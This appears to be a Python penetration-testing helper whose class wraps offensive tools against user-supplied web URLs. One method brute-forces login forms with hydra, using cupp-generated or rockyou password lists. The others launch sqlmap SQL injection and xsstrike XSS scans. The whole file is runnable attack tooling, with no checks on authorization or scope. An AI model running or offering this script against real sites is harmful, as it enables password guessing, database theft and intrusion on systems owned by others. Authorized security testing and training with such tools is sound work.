import subprocess
import os

class Networking:
    def __init__(self, url):
        self.url = url

    def brute_force(self):
        print("\033[1;32;40m Bruteforcing a login page using hydra \033[m")
        login_page = input("Enter the login page URL: ")
        path = input("Enter the path of the login page( Example /login/index.php:username=^USER^&password=^PASS^:F=incorrect login): ")
        username = input("Enter the username (default is admin): ") or "admin"
        use_password_generator = input("Do you want to generate a password list? (y/n): ")
        if use_password_generator.lower() == "y":
            subprocess.run(["cupp", "-i"])
            cupp_file_name = input("Enter the file name generated: ")
            password_list = cupp_file_name
       
        else:
            password_list = "rockyou.txt"

        subprocess.run(["hydra", "-l", username, "-P", password_list, login_page, "-v", "http-post-form", f"{path}"])


    def sql_injection(self):
        print("\033[1;32;40m SQL INJECTION \033[m")
        url = input("Please enter a URL: ")
        subprocess.run(["sqlmap", "-u", url, "--wizard"])


    def xss(self):
        print("\033[1;32;40m XSS Detection \033[m")
        url = input("Enter the URL: ")
        subprocess.run(["xsstrike", "-u", url])

        
    
